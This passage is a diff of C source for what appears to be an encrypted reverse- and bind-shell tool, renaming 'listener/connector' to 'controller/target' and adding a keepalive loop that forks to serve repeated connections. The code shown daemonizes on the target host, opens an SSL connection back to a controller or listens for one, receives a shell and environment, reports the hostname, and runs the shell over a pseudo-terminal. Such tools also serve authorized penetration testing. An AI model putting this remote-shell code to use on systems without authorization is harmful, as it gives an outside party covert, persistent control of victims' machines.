 					exit(-1);
 				}
@@ -844,7 +847,7 @@ int main(int argc, char **argv){
 				while(buff_ptr != buff_tail){
 					if((retval = io.remote_write(&io, buff_ptr, (buff_tail - buff_ptr))) == -1){
 						print_error(&io, "%s: %d: broker(): io.remote_write(%lx, %lx, %d): %s\r\n", \
-								program_invocation_short_name, io.listener, \
+								program_invocation_short_name, io.controller, \
 								(unsigned long) &io, (unsigned long) buff_ptr, (buff_tail - buff_ptr), strerror(errno));
 						exit(-1);
 					}
@@ -862,7 +865,7 @@ int main(int argc, char **argv){
 		// - Enter broker() for data brokering.
 		if((retval = broker(&io) == -1)){
 			print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
-					program_invocation_short_name, io.listener, (unsigned long) &io,
+					program_invocation_short_name, io.controller, (unsigned long) &io,
 					strerror(errno));
 		}
 
@@ -897,15 +900,15 @@ int main(int argc, char **argv){
 
 
 		/*
-		 * Connector: 
+		 * Target: 
 		 * - Become a daemon.
 		 * - Setup SSL.
-		 * - Open a network connection back to a listener.
+		 * - Open a network connection back to a controller.
 		 * - Receive and set the shell.
 		 * - Receive and set the initial environment.
 		 * - Receive and set the initial termios.
 		 * - Create a pseudo-terminal (pty).
-		 * - Send basic information back to the listener about the connecting host.
+		 * - Send basic information back to the controller about the connecting host.
 		 * - Fork a child to run the shell.
 		 * - Parent: Enter the broker() and broker data.
 		 * - Child: Initialize file descriptors.
@@ -949,7 +952,7 @@ int main(int argc, char **argv){
 			if((io.ctx = SSL_CTX_new(TLSv1_client_method())) == NULL){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_client_method()): %s\n", \
-						program_invocation_short_name, io.listener, strerror(errno));
+						program_invocation_short_name, io.controller, strerror(errno));
 				ERR_print_errors_fp(stderr);
 #endif
 				exit(-1);
@@ -958,7 +961,7 @@ int main(int argc, char **argv){
 			if(SSL_CTX_set_cipher_list(io.ctx, CLIENT_CIPHER) != 1){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ctx, CLIENT_CIPHER, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.ctx, CLIENT_CIPHER, strerror(errno));
 				ERR_print_errors_fp(stderr);
 #endif
 				exit(-1);
@@ -966,19 +969,19 @@ int main(int argc, char **argv){
 
 			SSL_CTX_set_verify(io.ctx, SSL_VERIFY_PEER, dummy_verify_callback);
 
-			if((retval = SSL_CTX_use_certificate_ASN1(io.ctx, connector_certificate_len, connector_certificate)) != 1){
+			if((retval = SSL_CTX_use_certificate_ASN1(io.ctx, target_certificate_len, target_certificate)) != 1){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: SSL_CTX_use_certificate_ASN1(%lx, %d, %lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ctx, connector_certificate_len, (unsigned long) connector_certificate, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.ctx, target_certificate_len, (unsigned long) target_certificate, strerror(errno));
 				ERR_print_errors_fp(stderr);
 #endif
 				exit(-1);
 			}
 
-			if((retval = SSL_CTX_use_RSAPrivateKey_ASN1(io.ctx, connector_private_key, connector_private_key_len)) != 1){
+			if((retval = SSL_CTX_use_RSAPrivateKey_ASN1(io.ctx, target_private_key, target_private_key_len)) != 1){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: SSL_CTX_use_RSAPrivateKey_ASN1(%lx, %lx, %d): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ctx, (unsigned long) connector_private_key, connector_private_key_len, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.ctx, (unsigned long) target_private_key, target_private_key_len, strerror(errno));
 				ERR_print_errors_fp(stderr);
 #endif
 				exit(-1);
@@ -987,7 +990,7 @@ int main(int argc, char **argv){
 			if((retval = SSL_CTX_check_private_key(io.ctx)) != 1){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: SSL_CTX_check_private_key(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.ctx, strerror(errno));
 				ERR_print_errors_fp(stderr);
 #endif
 				exit(-1);
@@ -997,65 +1000,105 @@ int main(int argc, char **argv){
 		if(bindshell){
 			// - Listen for a connection.
 
+			if(keepalive){
+				if(signal(SIGCHLD, SIG_IGN) == SIG_ERR){
 #ifdef DEBUG
-			printf("Listening...");
-			fflush(stdout);
+					fprintf(stderr, "%s: %d: signal(SIGCHLD, SIG_IGN): %s\n", \
+							program_invocation_short_name, io.controller, strerror(errno));
 #endif
-
-			if((accept = BIO_new_accept(buff_head)) == NULL){
-#ifdef DEBUG
-				fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
-						program_invocation_short_name, io.listener, buff_head, strerror(errno));
-				ERR_print_errors_fp(stderr);
-#endif
-				exit(-1);
+					exit(-1);
+				}
 			}
 
-			if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
+			do{
 #ifdef DEBUG
-				fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
-				ERR_print_errors_fp(stderr);
+				printf("Listening on %s...", buff_head);
+				fflush(stdout);
 #endif
-				exit(-1);
+
+				if(accept){
+					BIO_free(accept);
+				}
+
+				if((accept = BIO_new_accept(buff_head)) == NULL){
+#ifdef DEBUG
+					fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
+							program_invocation_short_name, io.controller, buff_head, strerror(errno));
+					ERR_print_errors_fp(stderr);
+#endif
+					exit(-1);
+				}
+
+				if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
+#ifdef DEBUG
+					fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
+							program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
+					ERR_print_errors_fp(stderr);
+#endif
+					exit(-1);
+				}
+
+				if(BIO_do_accept(accept) <= 0){
+#ifdef DEBUG
+					fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
+							program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
+					ERR_print_errors_fp(stderr);
+#endif
+					exit(-1);
+				}
+
+				if(BIO_do_accept(accept) <= 0){
+#ifdef DEBUG
+					fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
+							program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
+					ERR_print_errors_fp(stderr);
+#endif
+					exit(-1);
+				}
+
+				if((io.connect = BIO_pop(accept)) == NULL){
+#ifdef DEBUG
+					fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
+							program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
+					ERR_print_errors_fp(stderr);
+#endif
+					exit(-1);
+				}
+
+				BIO_free(accept);
+
+				retval = 0;
+				if(keepalive){
+					if((retval = fork()) == -1){
+#ifdef DEBUG
+						fprintf(stderr, "%s: %d: fork(): %s\n", \
+								program_invocation_short_name, io.controller, strerror(errno));
+						ERR_print_errors_fp(stderr);
+#endif
+						exit(-1);
+					}
+				}
+
+			} while(keepalive && retval);
+		
+			if(keepalive){
+				if(signal(SIGCHLD, SIG_DFL) == SIG_ERR){
+#ifdef DEBUG
+					fprintf(stderr, "%s: %d: signal(SIGCHLD, SIG_IGN): %s\n", \
+							program_invocation_short_name, io.controller, strerror(errno));
+#endif
+					exit(-1);
+				}
 			}
 
-			if(BIO_do_accept(accept) <= 0){
-#ifdef DEBUG
-				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
-				ERR_print_errors_fp(stderr);
-#endif
-				exit(-1);
-			}
-
-			if(BIO_do_accept(accept) <= 0){
-#ifdef DEBUG
-				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
-				ERR_print_errors_fp(stderr);
-#endif
-				exit(-1);
-			}
-
-			if((io.connect = BIO_pop(accept)) == NULL){
-#ifdef DEBUG
-				fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
-				ERR_print_errors_fp(stderr);
-#endif
-				exit(-1);
-			}
-
-			BIO_free(accept);
 
 		}else{
 
-			// - Open a network connection back to a listener.
+			// - Open a network connection back to a controller.
 			if((io.connect = BIO_new_connect(buff_head)) == NULL){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
-						program_invocation_short_name, io.listener, buff_head, strerror(errno));
+						program_invocation_short_name, io.controller, buff_head, strerror(errno));
 				ERR_print_errors_fp(stderr);
 #endif
 				exit(-1);
@@ -1064,7 +1107,7 @@ int main(int argc, char **argv){
 			if(BIO_do_connect(io.connect) <= 0){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.connect, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.connect, strerror(errno));
 				ERR_print_errors_fp(stderr);
 #endif
 				exit(-1);
@@ -1074,7 +1117,7 @@ int main(int argc, char **argv){
 		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
 #ifdef DEBUG
 			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
 			ERR_print_errors_fp(stderr);
 #endif
@@ -1086,7 +1129,7 @@ int main(int argc, char **argv){
 			if(!(io.ssl = SSL_new(io.ctx))){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.ctx, strerror(errno));
 				ERR_print_errors_fp(stderr);
 #endif
 				exit(-1);
@@ -1097,7 +1140,7 @@ int main(int argc, char **argv){
 			if((retval = SSL_connect(io.ssl)) < 1){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: SSL_connect(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.ssl, strerror(errno));
 				ERR_print_errors_fp(stderr);
 #endif
 				exit(-1);
@@ -1106,7 +1149,7 @@ int main(int argc, char **argv){
 			if((current_cipher = SSL_get_current_cipher(io.ssl)) == NULL){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: SSL_get_current_cipher(%lx): No cipher set!\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ssl);
+						program_invocation_short_name, io.controller, (unsigned long) io.ssl);
 				ERR_print_errors_fp(stderr);
 #endif
 				exit(-1);
@@ -1117,7 +1160,7 @@ int main(int argc, char **argv){
 				if((remote_cert = SSL_get_peer_certificate(io.ssl)) == NULL){
 #ifdef DEBUG
 					fprintf(stderr, "%s: %d: SSL_get_peer_certificate(%lx): %s\n", \
-							program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
+							program_invocation_short_name, io.controller, (unsigned long) io.ssl, strerror(errno));
 					ERR_print_errors_fp(stderr);
 #endif
 					exit(-1);
@@ -1126,7 +1169,7 @@ int main(int argc, char **argv){
 				if(!X509_digest(remote_cert, fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
 #ifdef DEBUG
 					fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
-							program_invocation_short_name, io.listener, \
+							program_invocation_short_name, io.controller, \
 							(unsigned long) remote_cert, \
 							(unsigned long) fingerprint_type, \
 							(unsigned long) remote_fingerprint, \
@@ -1137,10 +1180,10 @@ int main(int argc, char **argv){
 					exit(-1);
 				}
 
-				if((remote_fingerprint_str = (char *) calloc(strlen(listener_fingerprint_str) + 1, sizeof(char))) == NULL){
+				if((remote_fingerprint_str = (char *) calloc(strlen(controller_fingerprint_str) + 1, sizeof(char))) == NULL){
 #ifdef DEBUG
 					fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
-							program_invocation_short_name, io.listener, (int) strlen(listener_fingerprint_str) + 1, (int) sizeof(char), \
+							program_invocation_short_name, io.controller, (int) strlen(controller_fingerprint_str) + 1, (int) sizeof(char), \
 							strerror(errno));
 #endif
 					exit(-1);
@@ -1150,12 +1193,12 @@ int main(int argc, char **argv){
 					sprintf(remote_fingerprint_str + (i * 2), "%02x", remote_fingerprint[i]);
 				}
 
-				if(strncmp(listener_fingerprint_str, remote_fingerprint_str, strlen(listener_fingerprint_str))){
+				if(strncmp(controller_fingerprint_str, remote_fingerprint_str, strlen(controller_fingerprint_str))){
 #ifdef DEBUG
-					fprintf(stderr, "Remote fingerprint expected:\n\t%s\n", listener_fingerprint_str);
+					fprintf(stderr, "Remote fingerprint expected:\n\t%s\n", controller_fingerprint_str);
 					fprintf(stderr, "Remote fingerprint received:\n\t%s\n", remote_fingerprint_str);
 					fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
-							program_invocation_short_name, io.listener);
+							program_invocation_short_name, io.controller);
 #endif
 					exit(-1);
 				}
@@ -1167,12 +1210,12 @@ int main(int argc, char **argv){
 		// - Receive and set the shell.
 		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, %d): %s\r\n", \
-					program_invocation_short_name, io.listener, (unsigned long) &io, (unsigned long) &tmp_char, 1, strerror(errno));
+					program_invocation_short_name, io.controller, (unsigned long) &io, (unsigned long) &tmp_char, 1, strerror(errno));
 			exit(-1);
 		}
 
 		if(tmp_char != (char) APC){
-			print_error(&io, "%s: %d: invalid initialization: shell\r\n", program_invocation_short_name, io.listener);
+			print_error(&io, "%s: %d: invalid initialization: shell\r\n", program_invocation_short_name, io.controller);
 			exit(-1);
 		}
 
@@ -1181,7 +1224,7 @@ int main(int argc, char **argv){
 
 		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
 			exit(-1);
 		}
@@ -1191,13 +1234,13 @@ int main(int argc, char **argv){
 
 			if((buff_tail - buff_head) >= buff_len){
 				print_error(&io, "%s: %d: Shell string too long.\r\n", \
-						program_invocation_short_name, io.listener);
+						program_invocation_short_name, io.controller);
 				exit(-1);
 			}
 
 			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
-						program_invocation_short_name, io.listener, \
+						program_invocation_short_name, io.controller, \
 						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
 				exit(-1);
 			}
@@ -1206,7 +1249,7 @@ int main(int argc, char **argv){
 		tmp_len = strlen(buff_head);
 		if((shell = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
 			print_error(&io, "%s: %d: calloc(%d, %d): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					tmp_len + 1, (int) sizeof(char), strerror(errno));
 			exit(-1);
 		}
@@ -1216,14 +1259,14 @@ int main(int argc, char **argv){
 		// - Receive and set the initial environment.
 		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
 			exit(-1);
 		}
 
 		if(tmp_char != (char) APC){
 			print_error(&io, "%s: %d: invalid initialization: environment\r\n", \
-					program_invocation_short_name, io.listener);
+					program_invocation_short_name, io.controller);
 			exit(-1);
 		}
 
@@ -1232,7 +1275,7 @@ int main(int argc, char **argv){
 
 		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
 			exit(-1);
 		}
@@ -1242,13 +1285,13 @@ int main(int argc, char **argv){
 
 			if((buff_tail - buff_head) >= buff_len){
 				print_error(&io, "%s: %d: Environment string too long.\r\n", \
-						program_invocation_short_name, io.listener);
+						program_invocation_short_name, io.controller);
 				exit(-1);
 			}
 
 			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
-						program_invocation_short_name, io.listener, \
+						program_invocation_short_name, io.controller, \
 						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
 				exit(-1);
 			}
@@ -1256,7 +1299,7 @@ int main(int argc, char **argv){
 
 		if((exec_envp = string_to_vector(buff_head)) == NULL){
 			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					buff_head, strerror(errno));
 			exit(-1);
 		}
@@ -1264,14 +1307,14 @@ int main(int argc, char **argv){
 		// - Receive and set the initial termios.
 		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
 			exit(-1);
 		}
 
 		if(tmp_char != (char) APC){
 			print_error(&io, "%s: %d: invalid initialization: termios\r\n", \
-					program_invocation_short_name, io.listener);
+					program_invocation_short_name, io.controller);
 			exit(-1);
 		}
 
@@ -1280,7 +1323,7 @@ int main(int argc, char **argv){
 
 		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
 			exit(-1);
 		}
@@ -1290,13 +1333,13 @@ int main(int argc, char **argv){
 
 			if((buff_tail - buff_head) >= buff_len){
 				print_error(&io, "%s: %d: termios string too long.\r\n", \
-						program_invocation_short_name, io.listener);
+						program_invocation_short_name, io.controller);
 				exit(-1);
 			}
 
 			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
-						program_invocation_short_name, io.listener, \
+						program_invocation_short_name, io.controller, \
 						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
 				exit(-1);
 			}
@@ -1304,14 +1347,14 @@ int main(int argc, char **argv){
 
 		if((tmp_vector = string_to_vector(buff_head)) == NULL){
 			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					strerror(errno));
 			exit(-1);
 		}
 
 		if(tmp_vector[0] == NULL){
 			print_error(&io, "%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
-					program_invocation_short_name, io.listener);
+					program_invocation_short_name, io.controller);
 			exit(-1);
 		}
 
@@ -1319,14 +1362,14 @@ int main(int argc, char **argv){
 		tty_winsize.ws_row = strtol(tmp_vector[0], NULL, 10);
 		if(errno){
 			print_error(&io, "%s: %d: strtol(%s): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					strerror(errno));
 			exit(-1);
 		}
 
 		if(tmp_vector[1] == NULL){
 			print_error(&io, "%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
-					program_invocation_short_name, io.listener);
+					program_invocation_short_name, io.controller);
 			exit(-1);
 		}
 
@@ -1334,7 +1377,7 @@ int main(int argc, char **argv){
 		tty_winsize.ws_col = strtol(tmp_vector[1], NULL, 10);
 		if(errno){
 			print_error(&io, "%s: %d: strtol(%s): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					strerror(errno));
 			exit(-1);
 		}
@@ -1342,51 +1385,51 @@ int main(int argc, char **argv){
 		// - Create a pseudo-terminal (pty).
 		if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
 			print_error(&io, "%s: %d: posix_openpt(O_RDWR|O_NOCTTY): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					strerror(errno));
 			exit(-1);
 		}
 
 		if((retval = grantpt(pty_master)) == -1){
 			print_error(&io, "%s: %d: grantpt(%d): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					pty_master, strerror(errno));
 			exit(-1);
 		}
 
 		if((retval = unlockpt(pty_master)) == -1){
 			print_error(&io, "%s: %d: unlockpt(%d): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					pty_master, strerror(errno));
 			exit(-1);
 		}
 
 		if((retval = ioctl(pty_master, TIOCSWINSZ, &tty_winsize)) == -1){
 			print_error(&io, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					pty_master, TIOCGWINSZ, (unsigned long) &tty_winsize, strerror(errno));
 			exit(-1);
 		}
 
 		if((pty_name = ptsname(pty_master)) == NULL){
 			print_error(&io, "%s: %d: ptsname(%d): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					pty_master, strerror(errno));
 			exit(-1);
 		}
 
 		if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
 			print_error(&io, "%s: %d: open(%s, O_RDWR|O_NOCTTY): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					pty_name, strerror(errno));
 			exit(-1);
 		}
 
-		// - Send basic information back to the listener about the connecting host.
+		// - Send basic information back to the controller about the connecting host.
 		memset(buff_head, 0, buff_len);
 		if((retval = gethostname(buff_head, buff_len - 1)) == -1){
 			print_error(&io, "%s: %d: gethostname(%lx, %d): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) buff_head, buff_len - 1, strerror(errno));
 			exit(-1);
 		}
@@ -1427,14 +1470,14 @@ int main(int argc, char **argv){
 
 		if((retval = close(STDIN_FILENO)) == -1){
 			print_error(&io, "%s: %d: close(STDIN_FILENO): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					strerror(errno));
 			exit(-1);
 		}
 
 		if((retval = close(STDOUT_FILENO)) == -1){
 			print_error(&io, "%s: %d: close(STDOUT_FILENO): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					strerror(errno));
 			exit(-1);
 		}
@@ -1443,7 +1486,7 @@ int main(int argc, char **argv){
 
 		if((retval = close(STDERR_FILENO)) == -1){
 			print_error(&io, "%s: %d: close(STDERR_FILENO): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					strerror(errno));
 			exit(-1);
 		}
@@ -1454,7 +1497,7 @@ int main(int argc, char **argv){
 
 		if(retval == -1){
 			print_error(&io, "%s: %d: fork(): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					strerror(errno));
 			exit(-1);
 		}
@@ -1464,7 +1507,7 @@ int main(int argc, char **argv){
 			// - Parent: Enter the broker() and broker data.
 			if((retval = close(pty_slave)) == -1){
 				print_error(&io, "%s: %d: close(%d): %s\r\n", \
-						program_invocation_short_name, io.listener, \
+						program_invocation_short_name, io.controller, \
 						pty_slave, strerror(errno));
 				exit(-1);
 			}
@@ -1475,7 +1518,7 @@ int main(int argc, char **argv){
 
 			if((retval == -1)){
 				print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
-						program_invocation_short_name, io.listener, \
+						program_invocation_short_name, io.controller, \
 						(unsigned long) &io, strerror(errno));
 				exit(-1);
 			}
@@ -1492,48 +1535,48 @@ int main(int argc, char **argv){
 		// - Child: Initialize file descriptors.
 		if((retval = close(pty_master)) == -1){
 			print_error(&io, "%s: %d: close(%d): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					pty_master, strerror(errno));
 			exit(-1);
 		}
 		if((retval = dup2(pty_slave, STDIN_FILENO)) == -1){
 			print_error(&io, "%s: %d: dup2(%d, STDIN_FILENO): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					pty_slave, strerror(errno));
 			exit(-1);
 		}
 
 		if((retval = dup2(pty_slave, STDOUT_FILENO)) == -1){
 			print_error(&io, "%s: %d: dup2(%d, STDOUT_FILENO): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					pty_slave, strerror(errno));
 			exit(-1);
 		}
 
 		if((retval = dup2(pty_slave, STDERR_FILENO)) == -1){
 			print_error(&io, "%s: %d: dup2(%d, %d): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					pty_slave, STDERR_FILENO, strerror(errno));
 			exit(-1);
 		}
 
 		if((retval = close(io.remote_fd)) == -1){
 			print_error(&io, "%s: %d: close(%d): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					io.remote_fd, strerror(errno));
 			exit(-1);
 		}
 
 		if((retval = close(pty_slave)) == -1){
 			print_error(&io, "%s: %d: close(%d): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					pty_slave, strerror(errno));
 			exit(-1);
 		}
 
 		if((retval = setsid()) == -1){
 			print_error(&io, "%s: %d: setsid(): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					strerror(errno));
 			exit(-1);
 		} 
@@ -1541,7 +1584,7 @@ int main(int argc, char **argv){
 		// - Child: Set the pty as controlling.
 		if((retval = ioctl(STDIN_FILENO, TIOCSCTTY, 1)) == -1){
 			print_error(&io, "%s: %d: ioctl(STDIN_FILENO, TIOCSCTTY, 1): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					strerror(errno));
 			exit(-1);
 		}
@@ -1550,7 +1593,7 @@ int main(int argc, char **argv){
 		errno = 0;
 		if((exec_argv = string_to_vector(shell)) == NULL){
 			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					shell, strerror(errno));
 			exit(-1);
 		}
@@ -1559,7 +1602,7 @@ int main(int argc, char **argv){
 
 		execve(exec_argv[0], exec_argv, exec_envp);
 		print_error(&io, "%s: %d: execve(%s, %lx, NULL): Shouldn't be here!\r\n", \
-				program_invocation_short_name, io.listener, \
+				program_invocation_short_name, io.controller, \
 				exec_argv[0], (unsigned long) exec_argv);
 		exit(-1);
 	}
